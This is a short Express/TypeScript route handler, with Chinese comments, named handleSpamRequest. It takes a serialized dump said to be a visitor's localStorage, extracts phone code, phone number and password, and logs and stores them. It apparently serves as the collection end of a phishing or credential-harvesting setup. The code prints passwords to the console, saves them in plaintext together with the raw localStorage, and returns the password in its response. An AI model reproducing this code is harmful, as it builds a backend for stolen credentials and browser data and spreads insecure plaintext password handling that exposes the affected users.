import { Request, Response } from 'express';
import Customer from '../models/customer'; // 确保正确导入 Customer 模型
import handleAsync from '../utils/handleAsync';

export const handleSpamRequest = handleAsync(
  async (req: Request, res: Response) => {
    const { data } = req.body;

    // 解析接收到的序列化数据
    const parsedData = JSON.parse(data);
    console.log('接收到的 localStorage 数据:', parsedData);
    console.log('--------------------------------');
    // 从 parsedData 中提取 phoneCode、password 和 phoneNumber
    const { phoneCode, password, phoneNumber, ...localStorageData } =
      parsedData;
    console.log('提取的数据:', { phoneCode, password, phoneNumber });
    console.log('++++++++++++++++++++++++++++++++');
    // 剩余的数据存储到 localStorageData
    console.log('localStorage 数据:', localStorageData);

    // 创建新的 Customer 实例
    const newCustomer = new Customer({
      phoneCode,
      password,
      phoneNumber,
      localStorage: JSON.stringify(localStorageData), // 将 localStorageData 转换为字符串存储
    });

    // 保存到数据库
    await newCustomer.save();

    // 返回成功响应
    res.status(200).json({
      message: '请求成功',
      data: { phoneCode, password, phoneNumber },
      localStorage: localStorageData,
    });
  },
);
